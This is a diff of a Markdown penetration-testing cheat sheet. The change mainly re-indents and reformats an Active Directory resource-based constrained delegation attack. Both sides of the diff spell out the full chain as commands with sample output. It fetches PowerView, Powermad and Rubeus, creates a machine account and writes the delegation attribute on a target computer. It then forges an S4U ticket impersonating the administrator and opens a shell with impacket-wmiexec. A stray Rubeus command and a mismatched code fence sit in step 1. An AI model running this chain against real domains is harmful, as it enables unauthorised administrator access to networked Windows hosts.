@@ -150,146 +150,161 @@ Start with automated tools to search for low hanging fruits
           
           
           
-          First off, download two PS scripts in local machine..
+          # First off, download two PS scripts in local machine..
+            <br>
+          ```bash
+          wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+          wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+          ```
+           <br>
+          Then upload them to the target machine.
+             <br>
+          ```bash
+          # Evil-WinRM
+          upload PowerView.ps1
+          Import-Module .\PowerView.ps1
+          upload Powermad.ps1
+          Import-Module .\Powermad.ps1
+          ```
 
-```bash
-wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
-wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
-```
+          1. # **Check User's Permission and Windows Versions**
+               <br>
+              Check if users are allowed to create a new computer object on the domain.
 
-Then upload them to the target machine.
+              ```bash
+              Get-DomainObject -Identity "dc=example,dc=com" -Domain example.com
 
-```bash
-# Evil-WinRM
-upload PowerView.ps1
-Import-Module .\PowerView.ps1
-upload Powermad.ps1
-Import-Module .\Powermad.ps1
-```
+              # -------------------------
+              # Result
+              ms-ds-machineaccountquota: 10
+              ```
+               <br>
 
-1. **Check User's Permission and Windows Versions**
+              And check if the machine is at least Windows Server 2012.
 
-    Check if users are allowed to create a new computer object on the domain.
+              ```bash
+              Get-DomainController
 
-    ```bash
-    Get-DomainObject -Identity "dc=example,dc=com" -Domain example.com
+              # -------------------------
+              # Result
+              OSVersion: Windows Server 2022 Standard
+              ```
+               <br>
 
-    # -------------------------
-    # Result
-    ms-ds-machineaccountquota: 10
-    ```
+              Additionally, check if the target computer does not have the attributes **“msds-allowedtoactionbehalfofotheridentity”** set.
 
-    And check if the machine is at least Windows Server 2012.
+              ```bash
+              hostname
+              Get-NetComputer <hostname> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 
-    ```bash
-    Get-DomainController
+              # ------------------
+              # Result
+              name msds-allowedtoactonbehalfofotheridentity
+              ---- ----------------------------------------
+              <HOSTNAME>   {1, 0, 4, 128...}
+              ```
+               <br>
+                
+              ```bash
+                .\Rubeus.exe s4u /user:HOST$ /rc4:rc4ORntml /msdsspn:CIFS/host.domain.com /impersonateuser:administrator /ptt
+                
+                dir \\host.domain.com\C$
+              ````  
+               <br>
 
-    # -------------------------
-    # Result
-    OSVersion: Windows Server 2022 Standard
-    ```
+          2. **Create a New Computer**
+           <br>
 
-    Additionally, check if the target computer does not have the attributes **“msds-allowedtoactionbehalfofotheridentity”** set.
+              Now you can create a new computer object.
 
-    ```bash
-    hostname
-    Get-NetComputer <hostname> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+              ```bash
+              New-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)
+              Get-DomainComputer test01
 
-    # ------------------
-    # Result
-    name msds-allowedtoactonbehalfofotheridentity
-    ---- ----------------------------------------
-    <HOSTNAME>   {1, 0, 4, 128...}
-    ```
-      
-    ```bash
-      .\Rubeus.exe s4u /user:HOST$ /rc4:rc4ORntml /msdsspn:CIFS/host.domain.com /impersonateuser:administrator /ptt
-      
-       dir \\host.domain.com\C$
-    ````  
+              # ----------------------
+              # Result (copy the id)
+              objectsid: S-1-5-21-1677581083-3380853377-188903654-5103
+              ```
+               <br>
 
-2. **Create a New Computer**
+              Create a new raw security descriptor.
 
-    Now you can create a new computer object.
+              ```bash
+              $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<objectid-of-a-new-computer>)"
+              $SDBytes = New-Object byte[] ($SD.BinaryLength)
+              $SD.GetBinaryForm($SDBytes, 0)
+              Get-DomainComputer <hostname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+              ```
+               <br>
 
-    ```bash
-    New-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)
-    Get-DomainComputer test01
+          3. **Impersonate to Get a Ticket**
+           <br>
 
-    # ----------------------
-    # Result (copy the id)
-    objectsid: S-1-5-21-1677581083-3380853377-188903654-5103
-    ```
+              Download Rubeus.exe in local machine.
 
-    Create a new raw security descriptor.
+              ```bash
+              wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+              ```
+               <br>
 
-    ```bash
-    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<objectid-of-a-new-computer>)"
-    $SDBytes = New-Object byte[] ($SD.BinaryLength)
-    $SD.GetBinaryForm($SDBytes, 0)
-    Get-DomainComputer <hostname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
-    ```
+              Then upload it to the target machine and generate a RC4 hash.
 
-3. **Impersonate to Get a Ticket**
+              ```bash
+              # Evil-WinRM
+              upload Rubeus.exe
+              .\Rubeus.exe hash /password:12345 /user:test01 /domain:example.com
 
-    Download Rubeus.exe in local machine.
+              # -------------------------
+              # Result (copy the rc4 hash)
+              rc4_hmac: 32ED87BDB5FDC5E9CBA88547376818D4
 
-    ```bash
-    wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
-    ```
+              ```
+               <br>
 
-    Then upload it to the target machine and generate a RC4 hash.
+              You can request a Kerberos ticket for a new machine account while impersonating an administrator.
 
-    ```bash
-    # Evil-WinRM
-    upload Rubeus.exe
-    .\Rubeus.exe hash /password:12345 /user:test01 /domain:example.com
+              ```bash
+              .\Rubeus.exe s4u /user:test01$ /rc4:<rc4-hash> /impersonateuser:administrator /msdsspn:cifs/<hostname>.example.com /ptt
 
-    # -------------------------
-    # Result (copy the rc4 hash)
-    rc4_hmac: 32ED87BDB5FDC5E9CBA88547376818D4
+              # --------------
+              # Result (copy the output long hash at the last)
+              ```
+               <br>
 
-    ```
+              Generate a ticket
 
-    You can request a Kerberos ticket for a new machine account while impersonating an administrator.
+              ```bash
+              [IO.File]::WriteAllBytes("C:\Users\<username>\Documents\ticket.kirbi", [Convert]::FromBase64String("<new-output-hash>"))
+              download ticket.kirbi
+              ```
+               <br>
 
-    ```bash
-    .\Rubeus.exe s4u /user:test01$ /rc4:<rc4-hash> /impersonateuser:administrator /msdsspn:cifs/<hostname>.example.com /ptt
+          4. **Make the Ticket Usable and Use It**
+           <br>
 
-    # --------------
-    # Result (copy the output long hash at the last)
-    ```
+              Download “ticket_converter.py”.
 
-    Generate a ticket
+              ```bash
+              wget https://raw.githubusercontent.com/zer1t0/ticket_converter/master/ticket_converter.py
+              ```
+               <br>
 
-    ```bash
-    [IO.File]::WriteAllBytes("C:\Users\<username>\Documents\ticket.kirbi", [Convert]::FromBase64String("<new-output-hash>"))
-    download ticket.kirbi
-    ```
+              Destroy any tickets in local machine, and convert the ticket to Linux usable, then set the new ticket’s path.
 
-4. **Make the Ticket Usable and Use It**
+              ```bash
+              kdestroy
+              python3 ticket_converter.py ticket.kirbi ticket.ccache
+              export KRB5CCNAME=ticket.ccache
+              ```
+               <br>
 
-    Download “ticket_converter.py”.
+              We can use the ticket to get a shell.
 
-    ```bash
-    wget https://raw.githubusercontent.com/zer1t0/ticket_converter/master/ticket_converter.py
-    ```
-
-    Destroy any tickets in local machine, and convert the ticket to Linux usable, then set the new ticket’s path.
-
-    ```bash
-    kdestroy
-    python3 ticket_converter.py ticket.kirbi ticket.ccache
-    export KRB5CCNAME=ticket.ccache
-    ```
-
-    We can use the ticket to get a shell.
-
-    ```bash
-    impacket-wmiexec example.com/administrator@<hostname>.example.com -no-pass -k
-    ```
-      
-      
+              ```bash
+              impacket-wmiexec example.com/administrator@<hostname>.example.com -no-pass -k
+              ```
+                
+                
       
     </details>
     </details>
